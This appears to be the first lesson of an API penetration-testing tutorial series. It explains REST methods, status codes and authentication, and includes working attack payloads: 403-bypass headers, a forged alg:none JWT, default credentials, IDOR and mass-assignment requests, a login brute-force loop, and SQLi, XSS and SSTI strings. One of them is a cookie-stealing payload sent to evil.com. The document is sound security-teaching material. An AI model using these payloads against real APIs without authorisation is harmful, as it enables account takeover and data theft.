# REST API Security: A Complete Beginner's Guide

> **Series:** 30-Day API Pentesting  
> **Day:** 1 — Week 1: API Fundamentals & Recon  
> **Topic:** REST API Architecture Explained for Hackers

---

## What is a REST API?

REST (Representational State Transfer) is an architectural style for building web services. Every app you use — Instagram, Twitter, banking apps, Uber — communicates via REST APIs under the hood. As a bug hunter, APIs are your primary attack surface.

**Core concepts:**
- **Stateless** — server stores NO session state, every request is self-contained
- **Resources** — identified by URLs: `/users`, `/orders`, `/api/v1/admin`
- **Representations** — data returned as JSON (mostly), XML, or plain text
- **HTTP verbs** — define what action to perform on a resource

---

## HTTP Methods — The 5 You Must Test

| Method | Purpose | Security Notes |
|--------|---------|----------------|
| **GET** | Read data | Should never change state. Often lacks auth checks. |
| **POST** | Create resource | Most injection-prone — body contains user data |
| **PUT** | Update (full replace) | Test for mass assignment |
| **PATCH** | Update (partial) | Often less tested, less hardened |
| **DELETE** | Remove resource | Test without auth — many miss this |
| **OPTIONS** | CORS preflight | Reveals allowed methods |

```bash
# Always test ALL methods on every endpoint
curl -X GET    https://api.target.com/users/1
curl -X POST   https://api.target.com/users/1
curl -X PUT    https://api.target.com/users/1  -d '{"admin":true}'
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users/1 -v

# Bug: GET /api/delete-user?id=5 actually deletes → logic flaw!
```

---

## REST API Response Codes — Read Like a Hacker

```
200 OK          → Success. Dig into the response body — data leaks?
201 Created     → Resource created. What data is in the response?
204 No Content  → Deleted successfully. Confirm without auth?

400 Bad Request → Invalid input. Verbose error = info disclosure?
401 Unauthorized→ Missing/invalid token. Good — auth is enforced.
403 Forbidden   → Token valid but wrong role. Try bypass headers!
404 Not Found   → Endpoint doesn't exist. Or does it? Try variations.
405 Not Allowed → Method not allowed. Try other HTTP methods.
422 Unprocessable→ Validation error. Reveals expected field names!
429 Too Many Req→ Rate limited. If NOT returned after 100 reqs = bug!
500 Server Error→ CHECK THE BODY. Stack traces, DB errors, file paths!
```

```bash
# 403 Bypass headers to try:
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
```

---

## REST API Authentication Types

### 1. API Key
```bash
# In URL — worst practice, ends up in logs
GET /api/users?api_key=sk_live_abc123

# In Header — better
GET /api/users
X-API-Key: sk_live_abc123

# Test: can you guess/brute the key? Is it in JS files?
grep -r "api_key\|apikey\|api-key" . 2>/dev/null
```

### 2. Bearer JWT
```bash
GET /api/profile
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Decode on jwt.io — check:
# - Algorithm: HS256? Try alg:none bypass
# - Role field: "role":"user" → change to "role":"admin"
# - Expiry: exp claim — try expired token, does server accept?

# JWT None algorithm bypass:
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"userId":1,"role":"admin"}
# Signature: (empty)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.
```

### 3. Basic Auth
```bash
# base64(username:password)
Authorization: Basic YWRtaW46YWRtaW4=   # admin:admin
Authorization: Basic YWRtaW46cGFzc3dvcmQ=  # admin:password

# Test default credentials on every endpoint
```

---

## Top 5 REST API Vulnerabilities

### 1. BOLA / IDOR
```bash
# Change object IDs in the request
GET /api/v1/invoices/1001   # your ID = 1002
GET /api/v1/orders/999
GET /api/v1/users/1/data    # access user ID 2, 3, etc.

# Also test: body params, query params, headers
POST /api/create {"user_id": 9999}
```

### 2. Mass Assignment
```bash
# GET response shows hidden fields:
GET /api/me → {"id":100,"email":"x@x.com","role":"user","is_admin":false}

# Now send those fields in POST/PUT:
POST /api/register
{"email":"hack@hack.com","password":"Test1","role":"admin","is_admin":true}
```

### 3. Broken Authentication
```bash
# Remove auth header entirely
curl https://api.target.com/admin/users  # no Authorization header
# Expected: 401. Bug if: 200 OK

# Use Account B's token on Account A's resources
curl -H "Authorization: Bearer TOKEN_B" https://api.target.com/users/A/data
```

### 4. Missing Rate Limiting
```bash
# Send 100 requests — does it 429?
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://api.target.com/auth/login \
    -d '{"email":"victim@target.com","password":"guess'$i'"}'
done
# If no 429 returned = rate limit missing = brute force possible
```

### 5. Injection in JSON Body
```bash
# SQLi in JSON
{"username": "admin'--", "password": "x"}
{"id": "1 UNION SELECT username,password FROM users--"}

# XSS in JSON (stored in DB, rendered elsewhere)
{"name": "<script>alert(1)</script>"}
{"comment": "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"}

# SSTI in JSON
{"name": "{{7*7}}"}   # if response has 49 = SSTI confirmed
```

---

## API Recon — Finding Hidden Endpoints

```bash
# Common API documentation endpoints
curl https://target.com/swagger.json
curl https://target.com/swagger/v1/swagger.json
curl https://target.com/api-docs
curl https://target.com/openapi.json
curl https://target.com/v1/docs
curl https://target.com/graphql
curl https://target.com/.well-known/openid-configuration

# Brute force API paths
gobuster dir -u https://target.com/api \
  -w /opt/SecLists/Discovery/Web-Content/api/objects.txt

# Find endpoints in JavaScript bundles
npm install -g linkfinder
python3 linkfinder.py -i https://target.com/app.js -o cli

# Wayback Machine — historical endpoints
gau target.com | grep -E "api|v[0-9]" | sort -u

# API version enumeration
for v in v1 v2 v3 v4 beta alpha dev internal; do
  curl -s -o /dev/null -w "$v: %{http_code}\n" \
    https://target.com/api/$v/users
done
```

---

## Checklist

```
☐  Test ALL HTTP methods on every endpoint (GET/POST/PUT/DELETE/PATCH)
☐  Check /swagger, /api-docs, /openapi.json for full endpoint map
☐  Decode every JWT on jwt.io — check alg, role, expiry
☐  Try BOLA on every ID — path params, body params, query params
☐  Read every 500 error body — stack traces leak file paths and DB info
☐  Test every endpoint without Authorization header — expect 401
☐  Send 100 requests to /login — check if 429 is returned
☐  Add role/is_admin to every POST/PUT body — test mass assignment
```

---

*30-Day API Pentesting Series — follow for more.*
